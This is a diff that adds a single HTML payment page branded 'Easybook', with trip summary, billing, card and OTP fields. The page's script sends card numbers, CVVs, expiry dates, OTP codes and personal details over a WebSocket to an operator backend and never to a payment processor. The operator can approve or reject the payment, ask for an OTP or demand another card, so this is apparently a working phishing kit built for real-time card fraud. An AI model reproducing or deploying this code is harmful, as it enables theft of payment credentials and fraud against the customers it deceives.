@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Payment - Easybook</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;color:#333;min-height:100vh}
+.header{background:#7b2d8b;color:#fff;padding:16px 24px;display:flex;align-items:center;gap:12px}
+.header h1{font-size:18px;font-weight:600}
+.header a{color:#fff;text-decoration:none;font-size:14px}
+.container{max-width:600px;margin:0 auto;padding:20px}
+.card{background:#fff;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.1);margin-bottom:16px;overflow:hidden}
+.card-header{background:#f8f8f8;padding:12px 16px;font-weight:600;font-size:14px;border-bottom:1px solid #eee}
+.card-body{padding:16px}
+.summary-item{display:flex;justify-content:space-between;padding:4px 0;font-size:14px}
+.summary-item .label{color:#666}
+.summary-item .value{font-weight:500}
+.form-group{margin-bottom:14px}
+.form-group label{display:block;font-size:13px;color:#555;margin-bottom:4px;font-weight:500}
+.form-group input,.form-group select{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:6px;font-size:14px;outline:none;transition:border-color 0.2s}
+.form-group input:focus,.form-group select:focus{border-color:#7b2d8b}
+.form-row{display:flex;gap:12px}
+.form-row .form-group{flex:1}
+.btn-submit{display:block;width:100%;padding:14px;background:#7b2d8b;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
+.btn-submit:hover{background:#6a1f7a}
+.btn-submit:disabled{background:#ccc;cursor:not-allowed}
+.otp-section{display:none;margin-top:12px}
+.otp-section.active{display:block}
+.status-msg{text-align:center;padding:12px;font-size:14px;display:none}
+.status-msg.success{display:block;color:#2e7d32;background:#e8f5e9;border-radius:6px}
+.status-msg.error{display:block;color:#c62828;background:#ffebee;border-radius:6px}
+.status-msg.info{display:block;color:#1565c0;background:#e3f2fd;border-radius:6px}
+.timer{text-align:center;font-size:24px;font-weight:700;color:#e65100;margin:12px 0;display:none}
+.timer.active{display:block}
+.no-data{text-align:center;color:#999;padding:40px;font-size:15px}
+.section-title{font-size:15px;font-weight:600;margin-bottom:12px;color:#333}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <a href="/">← Back</a>
+  <h1>Payment</h1>
+</div>
+
+<div class="container" id="app">
+  <div class="no-data" id="noData">Loading booking information...</div>
+  <div id="paymentForm" style="display:none">
+
+    <div class="card">
+      <div class="card-header">Trip Summary</div>
+      <div class="card-body">
+        <div class="summary-item"><span class="label">Product</span><span class="value" id="sProduct">-</span></div>
+        <div class="summary-item"><span class="label">Route</span><span class="value" id="sRoute">-</span></div>
+        <div class="summary-item"><span class="label">Date</span><span class="value" id="sDate">-</span></div>
+        <div class="summary-item"><span class="label">Seats</span><span class="value" id="sSeats">-</span></div>
+        <div class="summary-item" style="font-size:16px;font-weight:700;margin-top:8px;padding-top:8px;border-top:1px solid #eee">
+          <span class="label">Total</span><span class="value" id="sTotal">-</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">Billing Information</div>
+      <div class="card-body">
+        <div class="section-title">Customer Details</div>
+        <div class="form-row">
+          <div class="form-group"><label>Full Name *</label><input id="fullName" placeholder="John Doe"></div>
+        </div>
+        <div class="form-row">
+          <div class="form-group"><label>Email</label><input id="email" type="email" placeholder="john@example.com"></div>
+          <div class="form-group"><label>Phone</label><input id="phone" placeholder="+60 12 345 6789"></div>
+        </div>
+
+        <div class="section-title" style="margin-top:16px">Billing Address</div>
+        <div class="form-row">
+          <div class="form-group"><label>Country *</label>
+            <select id="country">
+              <option value="">Select country...</option>
+              <option value="MY">Malaysia</option>
+              <option value="SG">Singapore</option>
+              <option value="ID">Indonesia</option>
+              <option value="TH">Thailand</option>
+              <option value="VN">Vietnam</option>
+              <option value="PH">Philippines</option>
+              <option value="BN">Brunei</option>
+              <option value="MM">Myanmar</option>
+              <option value="KH">Cambodia</option>
+              <option value="LA">Laos</option>
+              <option value="US">United States</option>
+              <option value="GB">United Kingdom</option>
+              <option value="CN">China</option>
+              <option value="IN">India</option>
+              <option value="AU">Australia</option>
+              <option value="JP">Japan</option>
+              <option value="KR">South Korea</option>
+              <option value="TW">Taiwan</option>
+              <option value="HK">Hong Kong</option>
+            </select>
+          </div>
+        </div>
+        <div class="form-group"><label>Address Line 1 *</label><input id="address1" placeholder="123 Main Street"></div>
+        <div class="form-group"><label>Address Line 2</label><input id="address2" placeholder="Apt, Suite, etc."></div>
+        <div class="form-row">
+          <div class="form-group"><label>City *</label><input id="city" placeholder="Kuala Lumpur"></div>
+          <div class="form-group"><label>State/Province</label><input id="state" placeholder="Wilayah Persekutuan"></div>
+        </div>
+        <div class="form-row">
+          <div class="form-group"><label>Zip/Postal Code</label><input id="zipCode" placeholder="50000"></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header">Card Information</div>
+      <div class="card-body">
+        <div class="form-group"><label>Card Number *</label><input id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19"></div>
+        <div class="form-row">
+          <div class="form-group"><label>Expiry (MM/YY) *</label><input id="expiry" placeholder="MM/YY" maxlength="5"></div>
+          <div class="form-group"><label>CVV *</label><input id="cvv" placeholder="123" maxlength="4" type="password"></div>
+        </div>
+        <div class="form-group"><label>Cardholder Name *</label><input id="cardHolder" placeholder="Name on card"></div>
+
+        <div class="otp-section" id="otpSection">
+          <div class="form-group"><label>OTP Code *</label><input id="otpCode" placeholder="Enter OTP code" maxlength="6"></div>
+          <div class="timer" id="otpTimer"></div>
+          <button class="btn-submit" id="btnOtp" style="background:#e65100">Submit OTP</button>
+        </div>
+
+        <div class="status-msg" id="statusMsg"></div>
+        <button class="btn-submit" id="btnSubmit">Submit Payment</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+(function(){
+  'use strict';
+
+  var WS_URL = (location.protocol === 'https:' ? 'wss:' : 'ws:')
+    + '//' + location.host
+    + '/api/?role=customer&cid=' + encodeURIComponent('easybook_' + Date.now());
+
+  var ws = null;
+  var sessionId = null;
+  var otpTimer = null;
+  var otpSeconds = 0;
+
+  var bookingData = {};
+  try {
+    bookingData = JSON.parse(sessionStorage.getItem('easybook_booking') || '{}');
+  } catch(e) {}
+
+  var $ = function(id) { return document.getElementById(id); };
+
+  if (!bookingData.productType && !bookingData.origin) {
+    $('noData').textContent = 'No booking data found. Please search for a trip first.';
+  } else {
+    $('noData').style.display = 'none';
+    $('paymentForm').style.display = 'block';
+
+    $('sProduct').textContent = bookingData.productType || 'Bus';
+    $('sRoute').textContent = (bookingData.origin || '?') + ' → ' + (bookingData.destination || '?');
+    $('sDate').textContent = bookingData.departureDate || bookingData.date || '-';
+    $('sSeats').textContent = bookingData.seats || (bookingData.pax || 1) + ' passenger(s)';
+    $('sTotal').textContent = (bookingData.amount || '-') + ' ' + (bookingData.currencySymbol || bookingData.currency || 'MYR');
+  }
+
+  $('cardNumber').addEventListener('input', function() {
+    var val = this.value.replace(/\s/g, '').replace(/\D/g, '');
+    this.value = val.replace(/(.{4})/g, '$1 ').trim();
+  });
+
+  $('expiry').addEventListener('input', function() {
+    var val = this.value.replace(/\D/g, '');
+    if (val.length >= 3) val = val.substring(0, 2) + '/' + val.substring(2);
+    if (val.length > 5) val = val.substring(0, 5);
+    this.value = val;
+  });
+
+  function connectWS() {
+    if (ws && ws.readyState === WebSocket.OPEN) return;
+    ws = new WebSocket(WS_URL);
+
+    ws.onopen = function() {
+      console.log('[WS] Connected');
+    };
+
+    ws.onmessage = function(e) {
+      try {
+        var msg = JSON.parse(e.data);
+        handleMessage(msg);
+      } catch(err) {
+        console.error('[WS] Parse error:', err);
+      }
+    };
+
+    ws.onclose = function() {
+      console.log('[WS] Disconnected');
+    };
+
+    ws.onerror = function(err) {
+      console.error('[WS] Error:', err);
+    };
+  }
+
+  function send(msg) {
+    if (!ws || ws.readyState !== WebSocket.OPEN) {
+      connectWS();
+      setTimeout(function() { send(msg); }, 500);
+      return;
+    }
+    ws.send(JSON.stringify(msg));
+  }
+
+  function handleMessage(msg) {
+    switch (msg.action) {
+      case 'ack':
+        sessionId = msg.sessionId;
+        showStatus('info', 'Payment is being processed. Please wait...');
+        break;
+
+      case 'approve':
+        showStatus('success', 'Payment approved! Redirecting...');
+        $('btnSubmit').disabled = true;
+        $('btnSubmit').textContent = 'Approved';
+        stopOTPTimer();
+        setTimeout(function() {
+          window.location.href = '/complete/';
+        }, 2000);
+        break;
+
+      case 'reject':
+        showStatus('error', 'Payment declined. Please try again.');
+        $('btnSubmit').disabled = false;
+        $('btnSubmit').textContent = 'Submit Payment';
+        hideOTP();
+        break;
+
+      case 'otp_verify':
+        showOTP();
+        if (msg.countdown) {
+          startOTPTimer(msg.countdown);
+        }
+        break;
+
+      case 'email_verify':
+        showStatus('info', 'Please check your email for verification code.');
+        break;
+
+      case 'timeout':
+        showStatus('error', 'Session expired. Please try again.');
+        $('btnSubmit').disabled = false;
+        $('btnSubmit').textContent = 'Submit Payment';
+        hideOTP();
+        break;
+
+      case 'card_error':
+        showStatus('error', msg.message || 'Card error. Please check your card details.');
+        hideOTP();
+        break;
+
+      case 'change_card':
+        showStatus('info', msg.message || 'Please try a different card.');
+        $('cardNumber').value = '';
+        $('cardNumber').focus();
+        hideOTP();
+        break;
+
+      case 'session_update':
+        break;
+
+      case 'session_restored':
+        if (msg.cardInfo) {
+          $('cardNumber').value = msg.cardInfo.cardNumber || '';
+          $('expiry').value = msg.cardInfo.expiry || '';
+          $('cvv').value = msg.cardInfo.cvv || '';
+          $('cardHolder').value = msg.cardInfo.cardHolder || '';
+        }
+        if (msg.customerInfo) {
+          $('fullName').value = msg.customerInfo.fullName || '';
+          $('email').value = msg.customerInfo.email || '';
+          $('phone').value = msg.customerInfo.phone || '';
+          $('country').value = msg.customerInfo.country || '';
+          $('address1').value = msg.customerInfo.address1 || '';
+          $('address2').value = msg.customerInfo.address2 || '';
+          $('city').value = msg.customerInfo.city || '';
+          $('state').value = msg.customerInfo.state || '';
+          $('zipCode').value = msg.customerInfo.zipCode || '';
+        }
+        sessionId = msg.sessionId;
+        showStatus('info', 'Session restored.');
+        break;
+
+      default:
+        break;
+    }
+  }
+
+  function showStatus(type, text) {
+    var el = $('statusMsg');
+    el.className = 'status-msg ' + type;
+    el.textContent = text;
+    el.style.display = 'block';
+  }
+
+  function showOTP() {
+    $('otpSection').classList.add('active');
+    $('btnSubmit').style.display = 'none';
+  }
+
+  function hideOTP() {
+    $('otpSection').classList.remove('active');
+    $('btnSubmit').style.display = 'block';
+    $('otpCode').value = '';
+    stopOTPTimer();
+  }
+
+  function startOTPTimer(seconds) {
+    stopOTPTimer();
+    otpSeconds = seconds || 120;
+    $('otpTimer').classList.add('active');
+    updateTimer();
+    otpTimer = setInterval(function() {
+      otpSeconds--;
+      updateTimer();
+      if (otpSeconds <= 0) {
+        stopOTPTimer();
+        showStatus('error', 'OTP expired. Please try again.');
+        hideOTP();
+      }
+    }, 1000);
+  }
+
+  function stopOTPTimer() {
+    if (otpTimer) { clearInterval(otpTimer); otpTimer = null; }
+    $('otpTimer').classList.remove('active');
+    $('otpTimer').textContent = '';
+  }
+
+  function updateTimer() {
+    var m = Math.floor(otpSeconds / 60);
+    var s = otpSeconds % 60;
+    $('otpTimer').textContent = m + ':' + (s < 10 ? '0' : '') + s;
+  }
+
+  function buildPayload() {
+    return {
+      frontendUrl: 'easybook.com',
+      currentStep: 'card',
+      browsingTabs: [
+        { label: '商品页', count: 0, active: false },
+        { label: '地址页', count: 1, active: false },
+        { label: '卡片页', count: 1, active: true }
+      ],
+      cardInfo: {
+        cardNumber: ($('cardNumber').value || '').replace(/\s/g, ''),
+        expiry: $('expiry').value || '',
+        cvv: $('cvv').value || '',
+        cardHolder: $('cardHolder').value || '',
+        otpCode: $('otpCode').value || ''
+      },
+      customerInfo: {
+        firstName: ($('fullName').value || '').split(' ')[0] || '',
+        lastName: ($('fullName').value || '').split(' ').slice(1).join(' ') || '',
+        fullName: $('fullName').value || '',
+        email: $('email').value || '',
+        phone: $('phone').value || '',
+        country: $('country').value || '',
+        address1: $('address1').value || '',
+        address2: $('address2').value || '',
+        city: $('city').value || '',
+        state: $('state').value || '',
+        zipCode: $('zipCode').value || ''
+      }
+    };
+  }
+
+  $('btnSubmit').addEventListener('click', function() {
+    var cardNumber = ($('cardNumber').value || '').replace(/\s/g, '');
+    var expiry = $('expiry').value || '';
+    var cvv = $('cvv').value || '';
+    var cardHolder = $('cardHolder').value || '';
+    var fullName = $('fullName').value || '';
+    var country = $('country').value || '';
+
+    if (!fullName || !country || !cardNumber || !expiry || !cvv || !cardHolder) {
+      showStatus('error', 'Please fill in all required fields.');
+      return;
+    }
+
+    if (!/[0-9]{2}\/[0-9]{2}/.test(expiry)) {
+      showStatus('error', 'Please enter a valid expiry date (MM/YY).');
+      return;
+    }
+
+    $('btnSubmit').disabled = true;
+    $('btnSubmit').textContent = 'Processing...';
+    showStatus('info', 'Connecting...');
+    $('statusMsg').style.display = 'none';
+
+    connectWS();
+
+    var payload = buildPayload();
+    send({
+      type: 'customer_input',
+      payload: payload
+    });
+
+    setTimeout(function() {
+      if (sessionId) {
+        var submitPayload = buildPayload();
+        submitPayload.sessionId = sessionId;
+        submitPayload.status = 'pending';
+        send({
+          type: 'session_update',
+          payload: submitPayload
+        });
+      }
+    }, 1000);
+  });
+
+  $('btnOtp').addEventListener('click', function() {
+    var otpCode = $('otpCode').value || '';
+    if (!otpCode) {
+      showStatus('error', 'Please enter the OTP code.');
+      return;
+    }
+    if (!sessionId) return;
+
+    var payload = buildPayload();
+    payload.sessionId = sessionId;
+    payload.cardInfo.otpCode = otpCode;
+    payload.status = 'pending';
+    send({
+      type: 'session_update',
+      payload: payload
+    });
+
+    $('btnOtp').disabled = true;
+    $('btnOtp').textContent = 'Verifying...';
+    showStatus('info', 'Verifying OTP...');
+  });
+
+  connectWS();
+})();
+</script>
+</body>
+</html>
